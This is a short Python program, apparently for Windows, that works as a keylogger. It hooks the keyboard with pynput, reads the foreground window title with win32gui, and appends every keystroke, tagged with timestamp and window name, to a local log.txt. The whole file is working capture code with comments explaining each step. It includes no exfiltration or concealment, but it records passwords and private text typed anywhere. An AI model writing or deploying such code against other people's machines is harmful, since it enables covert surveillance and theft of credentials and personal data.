from win32gui import GetWindowText, GetForegroundWindow
from datetime import datetime
from pynput import keyboard

LASTWINDOW = None


# Transforms "key" to a more legible version
def keycleanup(key):
    try:
        # If key equals or bigger than 96 and key smaller or equals to 105, do the operation [key - 96]
        # Used to transform numpad numbers to real numbers
        # This transforms a number keycode into a number (Ex: number '0' numpad keycode is 96. 96-96 = 0)
        if 96 <= key.vk <= 105:
            key = key.vk - 96
    except:
        pass

    # removes ' that comes with the "key" argument
    key = str(key).replace("'", "")

    # Checks the key size. If its bigger than 1, it is a special character (ex: space), then it adds [] to indicate it.
    # Ex: if you press space key, the "key" variable will be "Key.space". To avoid confusion, changes it to [space]
    if len(key) > 1:
        key = " [{}] ".format(key)
        key = key.replace("Key.", "")
    return key


# Appends time, key and in which window it was pressed on file "log.txt"
def onkeypress(key):
    global LASTWINDOW
    with open("log.txt", "a") as file:
        # Get the window name
        window = GetWindowText(GetForegroundWindow())

        # Checks if the window name is the same as LASTWINDOW
        # If different, prints the actual window name
        # If same, only adds to file the character typed
        if window != LASTWINDOW:
            LASTWINDOW = window
            timenow = datetime.now()
            file.write("\n\nIn Window -> [ {} ] -> {}\n".format(window, timenow.strftime("%d/%m/%Y %H:%M:%S")))

        # Transforms "key" to a more legible version
        key = keycleanup(key)

        print(key)
        
        # Write the key pressed on "log.txt" file
        file.write(key)


if __name__ == "__main__":
    # Keyboard listener. Each time a key is pressed, runs the function onkeypress with the key as parameter
    with keyboard.Listener(on_press=onkeypress) as listener:
        listener.join()
